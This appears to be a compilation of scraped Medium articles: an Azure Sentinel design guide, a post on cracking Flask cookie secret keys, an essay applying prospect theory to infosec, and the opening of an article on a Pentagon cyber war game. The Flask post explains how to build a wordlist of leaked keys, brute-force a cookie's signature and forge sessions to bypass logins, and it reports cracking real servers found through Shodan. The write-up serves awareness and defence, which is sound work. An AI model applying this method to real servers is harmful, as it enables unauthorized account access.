Want to detect crypto miners in your Linux VM on Azure? Enable Azure Security Center. Want to get best practices and insights on securing your network in Azure? Enable Azure Security Center.
However, if you want to coordinate your security operations centrally, and aggregate multiple security solutions, such as Azure Security Center, Microsoft’s Cloud App Security, Azure ATP and others, you will want to enable Azure Sentinel.
By connecting all these data sources, you can start building a single pane of glass, and have one point of entry for your responders when they need to go threat hunting.
DESIGN CONSIDERATION: Which other security solutions will I be enabling alongside Azure Sentinel?
The identity and access piece is important
As pointed out above, often the CISO office will require you to tightly control who has access to that aggregated data in Azure Sentinel, because it could contain personal identifiable (PII) data. Normally only appointed security officers will be granted ‘read access’.
DESIGN CONSIDERATION: Who needs access to the data in Azure Sentinel? Can we provide that access ‘just in time’ to these people & roles?
Microsoft is in the process of adding RBAC features to Log Analytics workspaces as Oleg Ananiev, the group program manager for both Azure Monitor and Log Analytics, points out. This will then implicitly work for Azure Sentinel. More information can be found here.
As people come and go in a company, security offers will also likely be changing over time. We don’t want to grant access to a specific person but to the role he or she is fulfilling. We also don’t want to grant access all the time, but only when needed; for instance, when hunting for threats, or when a specific case was raised, and an investigation is opened.
This is where Azure Active Directory (AAD) Privileged Identity Management (PIM) can help. You can find more information on Azure AD PIM here. You will need either Azure AD P2 licenses or EM+S E5 licenses for those users you would like to use with Azure AD PIM.
Plan for the data connections
Azure Sentinel has a lot of possible data sources. Each and everyone of those needs a data connection and potentially a configuration.
DESIGN CONSIDERATION: Which data sources will I be connecting? What configuration does that data connection need?
I won’t be writing up each configuration of each possible data source. But I will provide you with a few ones that you need to think about, because there are things to know on how you can connect them:
.
.
How should I connect other SIEM systems?
Some enterprises will already have some sort of SIEM solution, like for instance ArcSight. And while I am NOT advocating that this is the preferred way of setting up cloud governance, your CISO office might want to hook up Azure Sentinel to that current system.
DESIGN CONSIDERATION: Will I be connecting Azure Sentinel to another SIEM solution?
If that is a requirement, you will want to consider using Azure Monitor and Event Hubs to forward your alerts to this other system. By using Event Hubs, you can do this safely and reliably; even when the receiving end is offline or malfunctioning, events get stored in the queue and Azure will release them when the system is back online.
If your system is not supported by Azure Monitor or Event Hubs, there still a fair chance to get it integrated with Azure Sentinel. There is a growing list of third parties that have built their own integrations on top of the API, that you can use. You can find the list here.
How can we support the threat hunters?
Up until now, we’ve talked about getting data into Azure Sentinel. But after it gets processed and an alert gets raised, you will want to investigate. Your threat hunting colleagues need access to the data to understand what is going on.
DESIGN CONSIDERATION: What technology will the threat hunting colleagues be using? Do they prefer Jupyter? Will they require KQL access to the workspace?
One of the ways to do threat hunting is using the Kusto Query Language (KQL) and search through events quickly and easily in the workspace. They could use Azure Data Explorer, the ‘Logs’ function of the Log Analytics workspace, a third-party application (such as Grafana) or the native Azure Sentinel UI in the Microsoft Azure portal.
That last option, going threat hunting from the Azure Sentinel portal UI, is a neat option. Microsoft provides you out of the box with pre-fab hunting queries and maps them back to the right Tactics category (fi: Initial Access, Lateral Movement, etcetera). Either way, consider what you would to do to provide them with the right UI, and access rights.
Another popular option among threat hunters is Jupyter. Microsoft has a free service based on Jupyter notebooks called Azure Notebooks. Through the ‘Kqlmagic’ extension, you can use Python to directly query the workspace using KQL queries. I’ve wrote about that here. Consider if they will be using Jupyter locally (fi: in a docker container) or if they’ll use Azure Notebooks. Also consider where you will be storing the notebooks; GitHub is a great option for that. And remember, Microsoft already provides you with many sample notebooks to get you jumpstarted.
Dashboards: how will we visualize the Azure Sentinel data?
Azure Sentinel provides a lot of out-of-the-box dashboards. Some of them are solution focused (Office 365), some are technically focused (Insecure Protocols) and some are geared towards third parties (F5, Palo Alto, etcetera).
Technically, these are JSON files that work in the Azure Dashboards section of your portal. You import them into your Tenant, and they will be available for everyone who can access that Tenant. Of course, you can restrict this with the built-in Azure access controls as they are just resources like any other.
Microsoft regularly updates it (GitHub) repository with new versions of the dashboards as they receive feedback from the field. You can manually update the JSON file in your Tenant or use the built-in functions in the Azure Sentinel UI. Either way, you should plan for some change management around this.
DESIGN CONSIDERATION: What are my requirements for visualizing Azure Sentinel data? How do I provide access to those programs and/or operators?
Another popular choice to visualize data from Azure Sentinel is to use open source visualization tools. Grafana is a great option, because it has a large ‘store’ with visualization types (most of them free), and because Microsoft provides you with a native Log Analytics connector for Grafana.
With that connector, you can use Kusto (KQL) queries to get specific data from Azure Sentinel and map it onto one of Grafana’s visualizations. For instance, a world map with network connections, or a list of Alerts. Grafana has dashboarding features that most SOC’s will love, for instance the rotating dashboards. You will of course need to plan access from Grafana to Azure Sentinel’s data.
Escalation and notifications
All the above are technical design considerations. However, if Azure Sentinel will be powering your Security Operations Center (SOC), you will need to design your processes as well. How will your Alerts be followed up? Do we need a connection to our ticketing system? What if alerts & tickets stay open for too long? Are the right people, and potentially the management, informed in time (before breaching the SLA)?
DESIGN CONSIDERATION: What process do I need to run my Security Operations Center (SOC)? Which tools will support my Service Levels?
One of the options available to you out-of-the-box to automate the follow-up of alerts are Playbooks. In essence, these are Azure Logic Apps that can be triggered whenever a certain condition is met. For instance, an Alert with a high severity gets raised by Azure Sentinel, and you want to send this to a security engineer via text message. The logic app could contain code that connects to Twilio and sends the Alert description to a specified phone number.
But is this reliable enough? How do I know the security engineer has read it? What if he or she didn’t, and we need to escalate to the next engineer. Or worse yet, we’re approaching SLA times and we need to start informing management. This is where 3rd party solutions like SIGNL4 come in. There are a few out there, but SIGNL4 is great because it is a cloud service where you can set escalation paths, do two-way communication (to receive acknowledgement), use multiple channels (ersistent push, text and voice) and log the audit trail. They also support duty scheduling and have a 2-tier escalation model.
Key takeaways
The key takeaway from this article is that while Azure Sentinel is software-as-service, you should still plan for the implementation of the service. Gather your business / CISO requirements and consider for each subject what you should do. Also, don’t forget that it is not only a technical deployment, but you will need to plan for the process side as well.
Do you have other design considerations you are taking into account when deploying Azure Sentinel? Do you have real-world experience with Azure Sentinel? I would love to hear from you in the comments below.
Stay tuned for the next installment in my multi-part deep-dive series on Azure Sentinel!
— Maarten Goet, MVP & RD
Written by
","['Cloud Computing', 'Microsoft Azure', 'Azure', 'Cybersecurity']"
Baking Flask cookies with your secrets - Paradoxis,https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce?source=tag_archive---------8-----------------------,"Editors note: After receiving some criticism on various places for using the title “Defeating Flask’s Session Management”, I’ve decided to change the title as I feel the criticism is justified for being misleading.
A few weeks back, I and a friend of mine were discussing web frameworks and how he claimed to have made an ‘Impossible to Bypass’ login form. After asking him if I could see the code, he obliged and sent me a copy.
As expected, he remained true to his word and actually made it very secure. No SQL injection, no XSS, he even had rate limiting and audit logging. It seemed impossible to bypass without actually knowing the password.
That was of course, until I noticed he was using the secret key:
‘CHANGEME’
What my friend hadn’t realised is that having a weak secret key is more dangerous than you’d think when the client stores the current user’s state. Take the following sample application (which is a completely stripped down version of his application):
At first glance this looks impenetrable, I even opted to remove the login form itself (as we were never going to guess the passwords he made). So how would you go about getting that ‘You are logged in!’ message?
Flask by default uses something called ‘signed cookies’, which is simply a way of storing the current session data on the client (rather than the server) in such a way that it cannot (in theory) be tampered with.
One of the drawbacks of this approach, however, is that the cookies are not encrypted, they’re signed. This means that the content of the session can be read without the secret key.
And, after speaking to various Python developers, most assumed that the session data would be unreadable by the client as the code used to sign the cookies is called SecureCookieSessionInterface, which gave them a false sense of security. Take the following session:
The session data is the actual content of the session, while at first glance it looks unreadable, but to those who recognise it, it’s actually just a Base64 encoded string. If we were to decode this with itsdangerous’ base64 decoder, we’d get the following output:
The timestamp tells the server when the data was last updated. Depending on what version of itsdangerous you’re using, this might be the current Unix timestamp, or the current Unix timestamp minus the epoch (this was changed due to a bug, whereby people couldn’t set dates before 2011, source).
If the timestamp appears to be older than 31 days, the session is marked as expired and will be regarded as invalid.
This is the part which makes the cookie ‘secure’. Before the server sends you your latest session data, it calculates a sha1 hash based on the combination of your session data, current timestamp and the server’s secret key.
Whenever the server then sees that session again, it will deconstruct the parts, and verify them using the same method. If the hash doesn’t match the given data, it will know it has been tampered with and will regard the session as invalid.
This means that if your secret key is easy to guess or is publicly known, an attacker can cleverly modify the session’s content without much effort (speaking of secrets being publicly known, you’d be surprised how many results are returned on GitHub if you search for secret_key).
‘So how would I go about actually bypassing the authentication?’, you might be asking yourself. Take the following example (which you can follow along if you copy the code earlier in this blog post):
Before you can do anything, you’ll have to start the Flask application like so:
To obtain a session cookie, we’ll have to probe the server for a possible cookie. I did this by simply making a curl request to the server with the -v option to get verbose output (which prints the headers of the request), but you could also simply visit the web page and use a browser extension like EditThisCookie to get the contents of the cookie.
Do note that not all servers will instantly give you a session; some will only do this when trying to flash an error whereas others will only do so after logging in. You’ll have to figure this out on a case-by-case basis. For demonstration’s sake, our example server forcibly sets a session no matter what.
While it would be possible to brute-force each possible combination of letters, numbers and characters; a better approach would be to create a wordlist with known sources where developers might have posted their secret keys.
For this, I immediately thought of the following two locations: GitHub (as seen earlier) and StackOverflow (which generously allows you to download every single comment, post and edit ever made on the platform through archive.org).
For GitHub, I simply made a throwaway script which tried going over as many commits and files with the search term secret_key as possible, and for StackOverflow I iterated over each possible piece of text and tried to match possible secret keys with the following regular expression:
After a week of scraping GitHub posts on the background of my VPS, and combing through every StackOverflow post, comment and edit ever made I was left with a total of 37069 unique secret keys.
By combining a wordlist, the cookie we just obtained and parts of Flask’s session management code; we’re able to validate each secret key against the cookie to see if the signature is valid. If no error is raised, we’ll know we have a valid signature, which means we’ll have figured out the server’s secret key!
If our script was successful, we should now have found the server’s secret key! By now taking the same code, but instead of ‘load’ the session we ‘dump’ the session, we can create a cookie with any data we like.
If we were now to make a request to the same server, it should accept our crafted cookie, as it matches the expected secret key, which should trick it into believing we’re logged in.
I would like to point out that just because you can modify a session, doesn’t mean you’ll instantly be able to bypass an authentication mechanism. Not all systems are built the same and you’ll probably have to do some research to figure what and if it is possible to use this attack to your advantage.
Due to the fact that I had to do quite some work to figure out exactly how Flask handled their sessions, I decided to put the code into an easy-to-use command line tool which lets you scan your own server’s for this issue.
To install the tool, simply head over to your terminal and install it using pip:
If you don’t want the fairly bulky wordlist file included and only want to use the code itself, you can simply omit the [wordlist] from the command.
If you wish to see the source code, you can find this over on my GitHub.
Flask-Unsign has three main use-cases: it lets you: Decode, Sign and Unsign (crack) a cookie, with built-in HTTP support, which prevents you from having to open up your browser.
By now you’re probably asking yourself: What is the chance that this actually works in the real world? To test this, Rik van Duijn (cool guy, go check out his Twitter) and I did a few queries on Shodan to see how many public-facing devices were broadcasting that they might be running Flask.
We then narrowed it down to those who immediately set a session cookie (not only due to the fact that Shodan can get pricey, but crawling each host until we find a session cookie might be very intrusive, would most likely melt my router, and probably result in a phone call from my ISP asking what the hell I’m up to).
After downloading the results, I went to work to see exactly how many sessions I could successfully crack with a wordlist I created from a few days of scraping various data sources on the internet where people might post their secret keys.
Just because the servers are running Werkzeug, doesn’t mean they’re running Flask. Furthermore we’re not taking applications whose information is stripped by another web server like Nginx, those who don’t instantly set a cookie or which are running behind a firewall into account. So take the following data with a grain of salt.
While I initially started by brute-forcing the sessions on my MacBook, I quickly realised that MacBooks aren’t exactly cut out to run 32 CPU-slurping Python processes at once, so I switched to my (ever so slightly) more powerful gaming PC which obediently completed the task in under 20 minutes.
After weeding out the non-signed cookies (generally server-side cookies, or other frameworks which might use the same naming convention and base code as Flask), I was left with 1242 valid sessions. Passing each of these to Flask-Unsign, resulted in 352 cracked sessions which is a little over 28%. Of these 352 sessions, only 78 unique secret keys were used.
There are multiple ways you could avoid this issue. The first and most obvious way of doing so is to simply KEEP YOUR SECRET KEYS SECRET! Apart from the obvious ones, the following tips should help you keep your server more secure.
Stop using easy-to-guess secret keys; aim for something totally random instead. Ideally, you’d want to set your secret key to a random sequence of bytes each time you start your application, but this might be user-unfriendly as their session would expire each time your server is restarted.
The most practical solution is to simply generate a UUID. This can be done on most Unix-like systems by using the uuid or uuidgen command, or by running the following on a machine with Python:
Not only do you prevent attackers from figuring out your secret key, using server-side sessions also makes it impossible for an attacker to look at the contents of your session, as the only thing they’ll get is a unique token.
One way of doing this in Flask is by installing the Flask-Session, package and initializing it when your application is being built.
The following is a sample Flask application, which uses the previously-mentioned techniques to make sessions more robust.
Special thanks to Rik van Duijn for helping me out with general advice, and helping to generate the statistics showed earlier in this post.
Written by
","['virtual environment', 'Python', 'Flask', 'Security', 'Cybersecurity', 'Pentesting']"
Behavioral Models of InfoSec: Prospect Theory - Kelly Shortridge - Medium,https://medium.com/@kshortridge/behavioral-models-of-infosec-prospect-theory-c6bb49902768?source=tag_archive---------4-----------------------,"To those in the information security / cyber security industry, it’s an accepted truth that there exists a pernicious incentive structure that overwhelmingly puts the odds in the attacker’s favor. The consistent narrative is that defenders make irrational decisions and focus on the wrong problems while vendors peddle FUD and snake oil that not just fails to bolster the defensive cause, but inflicts ongoing harm.
But, I’ve seen less in the way of seeking to understand defenders’ irrational decision making patterns and why the industry is the way it currently is…and even less about how to fix this toxic feedback loop. So, armed with my modest background in behavioral economics from undergrad, I’ve decided to take a stab at examining the “why” and proposing some ways to twist these incentives in the defense’s favor.
My hope is that this kicks off a series where I examine different theories within behavioral economics against evidence within infosec. The tl;dr background on behavioral econ is that traditional economics views people as rational decision-making machines (i.e. “Homo economicus”) that can perfectly perform cost benefit analyses and choose an objectively optimal outcome. Behavioral econ, in contrast, recognizes that our brains are wired in a way that has been optimal for evolution, so it measures how people actually behave vs. how they optimally behave. We have quirks in our thinking that result in us making “irrational” decisions, but for understandable reasons.
This post will cover the O.G. theory in behavioral econ, Prospect Theory, as the first of many (potential) theories to help explain some of the dynamics of the infosec market.
Prospect Theory is a theory in behavioral econ that helps explain how people make decisions between options that bear certain probabilities and risk. The main thesis in Prospect Theory is that people make decisions by evaluating potential gains and losses through the lens of probability, rather than looking at the final, “objective” outcome. This relies on the decision-maker setting a reference point against which they measure outcomes.
Let’s consider a simple example to get a better sense of what this means in practice, using data from the original paper on Prospect Theory:
Decision #1: A) 100% chance of receiving $3,000 vs. B) 80% chance of receiving $4,000, but a 20% chance of receiving nothing
A’s expected outcome is $3,000 while B’s is $3,200…but 80% of subjects choose option A because it represents a guaranteed gain. Homo Economicus would scoff at these silly people and choose B.
Decision #2: C) 100% chance of losing $3,000 vs. D) 80% chance of losing $4,000, but a 20% chance of losing nothing
C’s expected outcome is losing $3,000 while D’s is losing $3,200. Homo Economicus naturally chooses C, but turns out 92% of people choose D for having the small chance of losing nothing.
People are inconsistent in their choices based on whether decisions result in a loss or gain, as well as how the decisions are framed. There are four key tenets resulting from Prospect Theory that I’ll examine with the lens of infosec:
Through the lens of Prospect Theory, my own theory is that defenders operate in the “realm of losses” while attackers operate in the “realm of gains.” As shown above, people in the domain of losses tend to be more risk-seeking, while those in the gain domain tend to be risk averse. In fact, losses felt by those in the gain domain are overvalued by 3:1 relative to those in the loss domain. The further defenders get away from their reference point, the more they’ll opt for small probabilities of a big leap closer to it instead of more certain, incremental improvements — that is, become more risk-seeking and pay more attention to potential payoffs rather than probabilistic outcomes.
Defenders take awhile to readjust their point of reference to match the status quo, which can really screw up their decision-making process; if potential outcomes are computed relative to the reference point, an outdated reference point will reinforce risky decision-making as defenders keep trying to jump back up to it. Attackers, on the other hand, will quickly update their reference point to the status quo. Given their predilection towards risk aversion and emphasis on weighing the probability of different outcomes, attackers need a technical and informational advantage to feel confident in their decision.
In order to figure out the behavioral predilections of defenders and attackers within the infosec arena, we need to determine the reference points that guide their behavior. My theory on infosec reference points is the following:
Therefore, we have the following conclusions on losses and gains for each party:
It’s important to highlight some examples of “irrational” behavior within infosec as a frame of reference for general theory, specifically focusing on differences in adoption (and hype) of various defensive security products. Irrational can be a subjective term, so I mean it in both the “counter to one’s own benefit” way and the “most outside observers think this is illogical” way.
Let’s start with EMET, Microsoft’s Enhanced Mitigation Experience Toolkit, a free tool that helps prevent software exploitation on Windows. Installing it and configuring commonly used applications with ASLR, DEP and other countermeasures significantly increases the difficulty of successfully compromising an application. While there are no official statistics, it’s widely accepted that EMET adoption rates are very low, despite it being free and well-tested.
In the years following the initial release of EMET, some of its features and functionality slowly crept into mainstream operating system releases, where their efficacy forced attackers to move to Office macros — a decision that involved attackers accepting the risk of savvy users who wouldn’t enable the macros rather than investing time in developing and retooling exploits to work in a post-EMET world. This is a good example of attacker risk aversion; they prefer to go for the fluffier target that requires less fancy exploitation, but still has a wide impact. Similarly, Java historically made a fantastic target for attackers because of its uniformity. Attackers could simply write their attack once and reuse it, which made it appealing from a ROI perspective.
Two-factor authentication (2FA) is another example of a solution that isn’t “sexy” per se but should receive greater hype relative to its defensive impact. It’s a low cost solution that’s easily deployed (particularly relative to most security products), and meaningfully bolsters account security beyond just passwords. Yet, it’s taken 7 years to get to the point where it is being widely acknowledged as a standard tool to have in the security arsenal — and adoption still isn’t ubiquitous among the largest consumer-facing firms, despite how inexpensive and simple it is.
Just take a look at the list of the firms who do and don’t have 2FA to see how many notable companies don’t have it yet. And, among the financial services firms who don’t, it’s a somewhat solid bet that they do have a FireEye box, Bromium or some other anti-APT tech which is vastly more expensive and helps against much lower-probability attacks.
The rise of ransomware and how little has been done to preemptively stop its growth and potency is also perplexing. According to PhishMe, 93% of all phishing emails now contain ransomware. McAfee says there were nearly 1.2 million new ransomware kits in Q1 2016 alone, the total nearing 6 million. It’s an unsophisticated attack that can easily be conducted by the 13 year old in Romania using basic malware kits, presenting a high ROI to the attacker. But given the prevalence and impact of ransomware, it seems irrational that companies are not doing more to protect against it.
Part of this is cleverness by the attacker in making the ransom’s cost low enough to not cause their targets to take drastic measures, but high enough that over a big enough target base, it results in lots of cash against a one-time upfront cost they can amortize over the lifetime of the attack. However, it’s more likely an element of defense being slow to update their reference points; companies could still be adopting relatively low-cost solutions and strategies to better defend themselves against ransomware, such as email protection, filesystem canaries, or even just a better backup process. All three of those solutions would benefit any organization beyond just becoming more resilient against ransomware, and yet they remain some of the most “boring,” underlooked categories.
Canaries in general, in fact, are a smart idea. Yet at only 4-figures per box, they are criminally under-adopted relative to 6-figure anti-APT boxes. It’s pretty straightforward: set up something that looks like a juicy target for an attacker, and get alerted when there’s suspicious activity. It helps give you early breach detection, inform your threat model and better understand attacker behaviors, all for a reasonable price. But adoption is very far from ubiquitous. Unfortunately it doesn’t have hand-wavy technology that “stops” advanced attacks — it comes across more like a mouse trap with cheese than a sexy elaborate laser tripwire maze.
As a final example, application whitelisting is a highly effective, albeit mundane technology. Plenty of organizations are still being compromised with new executables running, something easily thwarted by whitelisting. However, there’s a lower probability of catching an “elite” attack, given it’s likely to exploit an application directly. Critics will say that whitelisting reduces flexibility and bears a non-trivial amount of upfront setup, which is fair until you consider how difficult “sexy” tech, commonly using kernel-level modules, is to implement.
With the above as a reference, I’m going to walk through each of the four key tenets and examine their likely implications in infosec, and how they can explain the “irrational” decision making that many bemoan.
While it’s (mostly) simple accounting for defenders to know how much is spent on compliance, it’s a lot harder to know your organization’s security posture. Attackers can rely on (mostly) simple accounting to tally their cost and probably guesstimate the value of a successful attack, particularly if it’s selling personal data for $X per user vs. a nation state calculating how much crippling an enemy’s nuclear facility is worth to national security. Defenders, in contrast, can’t tally their costs as they go.
Figuring out your security posture is complicated for a few reasons. First, there are no sufficient industry benchmarks for security health against which organizations can compare themselves. Second, it’s highly unlikely that organizations will have full situational awareness to know which attacks are working against them and which they’re successfully thwarting. Third, defenders aren’t always sure what the “spoils of war” are, i.e. what value an attacker gains from hacking them, from customer data, intellectual property even to something like carbon credits. When it’s difficult to know what’s at risk, it’s difficult to weigh risk.
And, updating the reference point is a slow process for defenders. If their reference point is their perception of their security posture from 2014, it’s now outdated by two years at the minimum, during which attackers assuredly developed new techniques. Even once the reference point is updated to the status quo, the uncertainty in measuring organizational security risk and health means the new reference point will be equally as fuzzy. Just think about the ransomware example; if the reference point were based on today’s most probable threats, adopting technologies to prevent it should be a top budget priority.
Attackers, however, are quickly updating their reference points and evolving their methods based on the true status quo rather than their prior perception. Because the reference point serves as the foundation for decision making under prospect theory, the fact that attackers have more timely and accurate reference points gives them a decisive advantage at stage 1 over defenders.
We know that losses hurt 2.25x more than gains, and that attackers weigh losses 3x as much as defenders; to be a bit simplistic, the attacker’s “exchange rate” for gains and losses is therefore 1: 6.75. Defenders “just” need to make sure that for each additional dollar attackers spend towards breaching them, they’re getting less than $6.75 in additional value (I’ll discuss how defenders can do so in the last section).
As mentioned in the EMET example, attackers were probably inclined to switch to less arduous targets once it was released just based on the assumption that organizations would have adopted it, even though there wasn’t yet evidence of adoption. As a free tool, adopting it couldn’t present an easier, cost-effective opportunity for defenders to play into attacker’s loss aversion.
Both sides overweight small probabilities and underweight large ones. Defenders are predisposed towards following small probabilities of a better outcome (risk-seeking) while attackers will care more about certainty and shun options that have smaller probabilities of worse outcomes (risk-averse).
To feel confident in their abilities to pwn their target, attackers need a strong reference point and the ability to calculate the probabilities of different outcomes. The more information the attacker has about the target, the better they can predict probability, and the greater their technical abilities, the better they can minimize the probability of being caught. Consequently, playing with attackers’ sense of certainty is another tactic defenders can use.
In defensive decision making, it’s crucial to understand the impact and probability of an attack on your organization. There’s a reason why there’s been a collection of attempts to come up with a framework for information security risk-weighting — it’s vital, but an arguably unattainable goal. The variables are prohibitively multifarious, from the company’s industry, technology stack, business model, brand power, etc. to attacker motives, current malware landscape, or even geopolitical statuses.
It’s safe to assume that it’s an impossible task to enumerate all attacks and calculate each of their probabilities and impacts. Industry data is pragmatic since it provides a reasonable reflection on what attacks are most likely. There’s also some data to provide historical precedents on impacts; for example, there’s minimal impact to stock prices, but potentially longer-term impact to sales that ends up affecting stock prices (like in Target’s case). This still leaves the defender left to determine whether they’re robust enough to withstand these different types of attacks .
Now, remember that loss domain-ers will overweight small probabilities and my hypothesis that the only “gain” a defender can really have is stopping attacks that they did not think they could. This can easily support why information security is saturated with products that stop APT or “advanced” attacks, while companies are still getting popped with “basic” methods like phishing, simplistic web app vulnerabilities and outdated, repackaged malware. The tools I mentioned above, such as 2FA, canaries and whitelisting help stop the large-probability, quotidian attacks and thus don’t present an opportunity for a “gain.”
Such a limited potential for a gain facilitates greater emotional basis for action as well, such as Clausewitz’s “passionate hatred for the enemy.” It’s no wonder, then, that attribution is so popular while being functionally useless — at least defenders can have some respite that the culprits were found. But I believe it’s more than that; giving a “face” to the attackers provides a greater sense of certainty, however false that feeling might be. And if I’m generous, nicely bound reports on threat group “[clever noun describing the target group] + [noun of Chinese-associated thing]” detailing TTPs might actually help defenders improve their probability weighting of what attacks they’re likely to incur.
As defenders experience losses, they experience less “pain” for each additional instance. A big, acutely painful breach will more likely lead to action (of the risk-seeking kind) rather than death by a thousand paper cuts, which fully plays into diminishing sensitivity — each time a defender is hacked via a “stupid” bug, they’ll care less and less, so they’ll be less inclined to adopt security products that stop the repeated, lesser attacks (such as 2FA or canaries).
Another issue is that the outcome for defenders is often all or nothing. For example, if an attacker bypasses ASLR, the yield is 100% of the app; there’s no gray area where only part of the app is compromised, meaning from the defender’s point of view, it’s either a total loss or no loss. By this I mean, if an attacker has a 1/10 chance of guessing an address layout, the app is not 90% protected, and if an attacker guesses correctly, the app is 100% compromised. Thus, the impact of this 100% loss is the initial hit, and any subsequent hits don’t feel nearly as severe in comparison.
This disparity between losses is why incident response is such a lucrative business; when defenders are violently thrust deeper into the loss domain, they’re much more willing to spend whatever money necessary to get closer to their reference point again. This takes the form of expensive services or products that the IR providers say will help avoid this big, nasty pain they’re feeling…although this dynamic is often decried as predatory.
On the attacker side, achieving increasingly awe-inspiring levels of leetness loses its splendor after awhile; that is, there’s less motivation to strive for either an extra level of cost reduction or getting more value out of the attack. However, the initial gain leap can still be appealing, and is where I’d argue a lot of innovation happens…it’s just that there isn’t much incentive to continue to innovate.
This explains a few observations. First, that you commonly see the same attack being repackaged rather than completely new methods being used during a campaign. Second, wildly innovative, “great leap forward” vulnerability research is more common once some sort of new protection is developed and deployed (like ROP being used to work around a non-executable stack/heap), and less common when the status quo attacks can do just fine (like users plugging in shiny USBs they find in the parking lot).
What this also means, combined with attackers being more risk averse, is that reaching the next gain level will decreasingly justify the risk tradeoff. This is yet another benefit to the defense, since it can help deter ongoing campaigns even after an initial compromise — if you can up the cost of persistence, then developing tools for retaining system access on the target system will feel too risky relative to the lower gain payoff.
Now that I’ve tried explaining the why, it’s time to discuss how the balance of decision-making power can be shifted in favor of defense and some examples of tech that makes more sense to adopt. Clearly, defense is naturally predisposed to misjudging their real threat model, misallocating resources and miscalculating strategies, resulting in our current industry dystopia of a comically privileged offense, FUD marketing tactics, focus on thwarting sexier “advanced” attacks and a noxious romance with attribution.
Understanding you have a problem, what the problem is, and why you keep having it is step one. I’m not alone in using knowledge of behavioral econ to counter my human instincts towards suboptimal behavior (e.g. instant gratification monkey). So, I fully believe that defenders can leverage the knowledge of their weaknesses to correct their missteps and start leveraging their adversaries’ weaknesses against them.
If you’ve spoken to anyone in infosec with offensive experience, they’ll agree that “raising the cost of attack” is one of the most effective means of deterrence. I think re-framing it as “raising the stakes of attack” is more descriptive than cost, since it includes the notion of risk. The fact that attackers only care about their own outcome relative to the reference point, are extremely loss averse, prioritize certainty over a more valuable outcome and get less benefit out of successive gains all supports the idea of raising the stakes.
Defenders should prioritize efficiency when raising the stakes. Rather than focusing on less probable attacks, they should think about the commonalities between the technical and informational advantages that the spectrum of attackers possess. For example, a platform like Drawbridge Networks lets you detect and control lateral movement in an internal network, which could limit an attack’s impact in both more advanced attacks and common malware. Defenders often believe that cyber security products focused on countering “advanced” threats also counter more basic attacks, but that’s not always the case. It’s far simpler to raise the level of the lowest common denominator than try to stop each type of “sophisticated” method.
Eroding the informational advantage is the wisest move, since tackling the technical advantage is more of a cat-and-mouse game. “Silent” monitoring tech that gives visibility without informing the attacker can give defense the ability to respond quickly without the attacker realizing that they’ve been caught, so defenders can watch the attacker’s methods and gain valuable threat intelligence (the real kind). In contrast, technologies that use blocking are giving data to attackers that they can use to craft a better attack.
An effective technique that’s gaining some popularity is ensuring that the organization’s infrastructure isn’t static; attackers will have a substantially more difficult time attacking something that is constantly changing. Even more simplistically, setting up honey pots and other types of deception, like Thinkst’s Canary, can serve to foster uncertainty in the attacker as well as give defense the heads up that something nefarious is happening.
Defenders should also reduce their adversaries’ potential payoff in conjunction with raising the stakes. Having strict access control rules and a more segmented network means that a compromise of an individual machine doesn’t have much value, and attackers will have to expend more resources to get a bigger payoff. For example, deploying Duo Sec’s 2FA to end users reduces the value of their credentials by adding an extra hoop through which attackers must jump to illicitly access accounts.
But to counter their own weaknesses, defenders should take a data-driven approach — although data can have its flaws, it helps provide rational evidence of what the reference point should be. Having an ongoing picture of the “true” threat model may also encourage defenders to update their reference point more quickly, though it will still require some introspection to be aware of their bias towards being slow to change their views. One tech solution with this approach is Signal Sciences, which uses a data-driven approach to web app security by providing a continuously updated reference point of security posture in that area.
There also needs to be a better understanding in defense of how they define a loss. As I theorized earlier, right now it’s mostly “being breached,” and that may indeed have an immediate impact on the security practitioner's job security. However, it’s probable that a nation state attacker will breach a company, exfiltrate some data for espionage purposes, and there will be no real effects felt by the company (particularly short-term). Enhancing the equation of probability * outcome with an improved understanding of the real impact different types of attackers has on the organization would meaningfully improve prioritization of what solutions to adopt from lens of what is bad from the organizational point of view vs. what is bad from an “objective” security point of view.
I really believe understanding the motivations behind this “irrational” defensive behavior is empowering. While even I tend to veer towards hyperbole when describing offense’s advantages, the offense isn’t invisible nor is their decision-making flawless, and I think Prospect Theory helps identify those vulnerabilities — so now the challenge is for defense to start exploiting them.
My hope is that rather than telling infosec defenders that they’re being stupid or irrational or that they’re totally crappy at their jobs, the industry can take a more empathetic approach and suggest strategies towards ameliorating counterproductive incentives. I don’t think that will eradicate FUD marketing tactics or snake oil products, but it probably can give solutions that actually help a fighting chance to make a difference.
In conclusion, let’s try to be more of a community and practice some collective mindfulness, and just maybe we can start fixing things.
Hi, I’m Kelly Shortridge. I’m co-founder of IperLane, helping organizations monitor and control access in their mobile enterprise without annoying their employees. We fit nicely into the “data driven” strategy I recommend above and help with situational awareness on mobile, with a side of granular access control.
I received a B.A. in Economics from Vassar College and have a predilection for behavioral econ (if you couldn’t tell). I don’t claim to be an expert, so if you’re an expert reading this, I’d be thrilled to hear your thoughts.
Written by
","['Cybersecurity', 'Security', 'Human Behavior', 'Defense', 'Information Security']"
"Believe It or Not, the Pentagon’s Cybersecurity Priorities Haven’t Changed in a Decade",https://medium.com/war-is-boring/believe-it-or-not-the-pentagons-cybersecurity-priorities-haven-t-changed-in-a-decade-aeee59d60ed3?source=tag_archive---------1-----------------------,"by JOSEPH TREVITHICK
A recently-released document highlights how little the Pentagon’s concerns and responses to threats in cyberspace have changed in the past decade. As American legislators debate the future of the military’s top cybersecurity headquarters, experts say that’s both good and bad.
In 2006, the Pentagon organized a first-of-its-kind exercise involving a “directed professional attack” across military computer networks. The “Bulwark Defender” cyber war game was supposed to help military planners determine how well troops from different units communicated with each other while enemy agents hacked their computers.
The exercise would “confirm [the] importance of defending networks,” according to an official review. War Is Boring obtained the report — previously labeled “for official use only” — via the Freedom of Information Act.
Given the content of the briefing, the Pentagon comes across as “pretty forward-looking,” Samuel Visner, a cybersecurity expert and senior vice president at ICF International, told War Is Boring via email. They “did a pretty fair job of characterizing threats to their networks.”
The exercise pitted a mock enemy “red team” against U.S. Air Force, Army and Navy and Marine Corps personnel in more than two-dozen command centers across the country. Over the course of two weeks, the attackers tried to break in, damage and otherwise harass computer systems.
The red team hit the defenders with everything in its hacking arsenal — hijacking their printers, stealing passwords and slowing or entirely shutting down networks.
In one phase of the exercise, the attackers were able to break into the computer networks at offices in the Air Force’s headquarters overseeing operations in the Pacific and Europe. They also gained control of, or turned off, networks in eight other locations.
